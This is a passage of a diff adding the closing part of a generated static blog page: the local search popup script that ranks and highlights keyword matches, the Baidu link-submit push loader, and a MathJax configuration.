+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+
+  
+
+  
+
+</div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end --></body></html>
